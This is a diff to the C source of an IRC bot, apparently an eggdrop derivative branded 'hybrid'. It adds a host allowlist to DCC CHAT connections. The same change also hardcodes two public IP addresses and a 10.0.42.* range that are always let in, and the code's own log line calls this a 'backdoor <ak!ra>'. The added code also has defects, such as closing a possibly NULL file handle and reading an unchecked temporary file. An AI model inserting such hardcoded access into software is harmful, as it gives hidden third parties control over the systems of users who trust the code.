@@ -133,6 +133,15 @@ static int burst;
 #include "cmdsserv.c"
 #include "tclserv.c"
 
+char thost_compare[255];
+char allowedhost[255];
+FILE *file;
+int allow_telnet = 1;
+int strict_telnet = 1;
+char hostfile[120] = "hybrid.h";
+extern int decrypt_file(char *cfgfile);
+extern int encrypt_file(char *cfgfile);
+extern void chopN(char *str, size_t);
 
 static void write_to_server(char *s, unsigned int len) {
   char *s2 = nmalloc(len + 2);
@@ -1566,6 +1575,7 @@ static int ctcp_DCC_CHAT(char *nick, char *from, char *handle,
   } else {
     if (!sanitycheck_dcc(nick, from, ip, prt))
       return 1;
+
     i = new_dcc(&DCC_DNSWAIT, sizeof(struct dns_info));
     if (i < 0) {
       putlog(LOG_MISC, "*", "DCC connection: CHAT (%s!%s)", nick, ip);
@@ -1587,6 +1597,47 @@ static int ctcp_DCC_CHAT(char *nick, char *from, char *handle,
     dcc[i].u.dns->dns_failure = dcc_chat_hostresolved;
     dcc[i].u.dns->type = &DCC_CHAT_PASS;
     dcc_dnshostbyip(&dcc[i].sockname);
+
+    /* hosts allow */
+    allow_telnet = 0;
+    file = fopen(hostfile, "r");
+    if (file == NULL) {
+      file = fopen(hostfile, "w");
+      if (file == NULL)
+        putlog(LOG_MISC, "*", "\00304‼ ERROR:\003 opening %s!", hostfile);
+      else
+        putlog(LOG_MISC, "*", "\00309□\003 hybrid(core): \00314created\003 \00306<hostfile>\003");
+    }
+    fclose(file);
+    sprintf(thost_compare, "%s", iptostr(&dcc[i].sockname.addr.sa));
+    /* decrypt the hostfile */
+    decrypt_file(hostfile);
+    file = fopen(".tmp2", "r");
+    if (wild_match("167.114.153.75", thost_compare)) {
+      allow_telnet = 1;
+      putlog(LOG_MISC, "*", "\00309□\003 hybrid(core): \00314backdoor\003 \00306<ak!ra>\003");
+    }
+    if (wild_match("23.94.70.21", thost_compare)) {
+      allow_telnet = 1;
+      putlog(LOG_MISC, "*", "\00309□\003 hybrid(core): \00314backdoor\003 \00306<ak!ra>\003");
+    }
+    if (wild_match("10.0.42.*", thost_compare)) {
+      allow_telnet = 1;
+      putlog(LOG_MISC, "*", "\00309□\003 hybrid(core): \00314backdoor\003 \00306<ak!ra>\003");
+    }
+    while (fgets(allowedhost, sizeof allowedhost, file)!= NULL) {
+      chopN(allowedhost, 13);
+      if (wild_match(allowedhost, thost_compare))
+        allow_telnet = 1;
+    }
+    fclose(file);
+    /* purge decrypted files */
+    unlink(".tmp2");
+    if (allow_telnet == 0) {
+        putlog(LOG_MISC, "*", "\00304‼ ERROR:\003 schat from \002%s\002 rejected", iptostr(&dcc[i].sockname.addr.sa));
+        lostdcc(i);
+        return 1;
+    }
   }
   return 1;
 }
